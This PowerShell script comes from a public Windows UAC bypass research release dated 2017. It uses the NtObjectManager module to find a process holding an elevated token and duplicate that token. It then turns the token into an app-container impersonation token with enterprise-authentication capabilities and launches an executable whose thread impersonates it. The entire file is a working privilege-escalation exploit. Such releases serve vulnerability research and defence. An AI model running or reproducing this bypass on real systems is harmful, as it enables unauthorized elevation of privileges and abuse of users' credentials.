#    This file is part of Zero Nights 2017 UAC Bypass Releases
#    Copyright (C) James Forshaw 2017
#
#    UAC Bypasses is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    UAC Bypasses is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with UAC Bypasses.  If not, see <http:#www.gnu.org/licenses/>.

# You need to Install-Module NtObjectManager for this to run.
# This script will grab an elevated token (including OTS) and execute an
# arbitrary executable with the main thread impersonating that user in an
# app container.

Import-Module NtObjectManager

$exe = "C:\test\ots_auth.exe"
$url = "http://dc"

# Function to find the first accessible elevated token.
function Get-ElevatedToken {
  Param([switch]$NoFilter)
  $token = $null
  while ($true) {
    Write-Host "Checking for elevated processes"
    $token = Use-NtObject($ps = Get-NtProcess) {  
      foreach($p in $ps) {
        try {
            $ret = Use-NtObject($token = Get-NtToken -Primary `
                                        -Process $p -Duplicate `
                                        -IntegrityLevel Medium) {
              if ($token.Elevated) {
                Write-Host "Found elevated token in process $p - Pid $($p.ProcessId)"
                return $token.Duplicate()
              }
            }
            if ($ret -ne $null) {
                return $ret
            }
        } catch {
        }
      }
    }
    if ($token -ne $null) {
      break
    }
    Start-Sleep -Seconds 1
  }

  if (!$NoFilter) {
    # Filter to remove elevated groups/privileges.
    $token = Use-NtObject($token) {
      Get-NtFilteredToken $token -Flags LuaToken
    }
  }
  return $token
}

$basedir = $PSScriptRoot

$acsid = Get-NtSid -Sddl "S-1-15-2-3624051433-2125758914-1423191267-1740899205-1073925389-3782572162-737981194"
$capsid = Get-NtSid -KnownSid CapabilityConstrainedImpersonation
$network1 = Get-NtSid -KnownSid CapabilityInternetClient
$network2 = Get-NtSid -KnownSid CapabilityInternetClientServer
$network3 = Get-NtSid -KnownSid CapabilityPrivateNetworkClientServer
$auth = Get-NtSid -KnownSid CapabilityEnterpriseAuthentication

$caps = @($capsid, $network1, $network2, $network3, $auth)

$token = Get-ElevatedToken -NoFilter
$token = Use-NtObject($token) {
    Use-NtObject($lowbox = Get-NtLowBoxToken $token -PackageSid $acsid -CapabilitySids $caps) {
        $lowbox.DuplicateToken("Impersonation")
    }
}

$sd = New-NtSecurityDescriptor -Sddl "D:(A;;GA;;;WD)(A;;GA;;;AC)"
$token.SetSecurityDescriptor($sd, "Dacl")
$token.SecurityDescriptor.Dacl | fl

$config = New-Win32ProcessConfig "$exe $url" -CurrentDirectory $env:SystemRootdir -CreationFlags Suspended
$config.AppContainerSid = $acsid
foreach($cap in $caps) {
    $config.Capabilities.Add($cap)
}

Use-NtObject($p = New-Win32Process -Config $config) {
    $p.Thread.SetImpersonationToken($token)
    $p.Process.Resume()
    $p.Process.Wait()
}
